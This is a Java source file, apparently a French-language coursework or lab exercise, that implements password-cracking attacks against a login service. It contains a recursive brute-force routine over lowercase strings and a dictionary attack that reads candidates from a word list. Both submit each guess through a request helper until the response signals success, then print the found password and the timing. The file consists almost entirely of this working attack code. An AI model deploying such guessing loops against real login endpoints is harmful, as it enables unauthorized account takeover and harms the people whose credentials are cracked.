package HttpRequest;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;


public class Factory {

    public static String bruteForceCracker(char[] chaine, int position) throws Exception{

        //lorsqu'on arrive à la dernière position de la chaine
        if(position == chaine.length - 1) {

            //On parcourt les différentes lettres de l'alphabet pour la dernière position
            for(int i = 97; i < 123; i++) {

                chaine[position] = decoderLaLettre(i);
                String motTrouve = new String(chaine);
                int response_requete = Request.requete(motTrouve);
                if (response_requete == 5) {

                    return motTrouve;

                }
            }
            return null;
        //Si la dernière position n'est pas atteinte  
        }else {

            for(int i = 97; i < 124 - 1; i++) {

                chaine[position] = decoderLaLettre(i);
                if(bruteForceCracker(chaine, position + 1) != null) {

                    return new String(chaine);

                }
                
            }
            return null;
        }

    }

    public static char decoderLaLettre(int codeAscii) {
        return (char) codeAscii;
    }

    public static String AttackDictionMDP() {
        long tempsDebut = System.currentTimeMillis(); // Mesure du temps de début

        File file = new File("dictionnaire.txt");
        Scanner scanner;
        try {
            scanner = new Scanner(file);
            while (scanner.hasNextLine()) {
                String MDP = scanner.nextLine();
                try {
                    int result = Request.requete(MDP);
                    if (result == 5) {
                        long tempsFin = System.currentTimeMillis(); // Mesure du temps de fin
                        long tempsExecution = tempsFin - tempsDebut; // Calcul du temps d'exécution en millisecondes
                        System.out.println("Mot de passe trouvé : " + MDP);
                        System.out.println("Temps d'exécution : " + tempsExecution + " ms");
                        scanner.close();
                        return MDP;
                    }
                } catch (Exception e) {
                    System.out.println("Erreur lors de l'envoi de la requête : " + e.getMessage());
                }
            }
            scanner.close();
        } catch (FileNotFoundException e) {
            System.out.println("Erreur : Fichier introuvable !");
        }
        long tempsFin = System.currentTimeMillis(); // Mesure du temps de fin
        long tempsExecution = tempsFin - tempsDebut; // Calcul du temps d'exécution en millisecondes
        System.out.println("Temps d'exécution : " + tempsExecution + " ms");
        return null;
    }

    public static void getChoix(int choice) {
        // TODO Auto-generated method stub
        throw new UnsupportedOperationException("Unimplemented method 'getChoix'");
    }
}
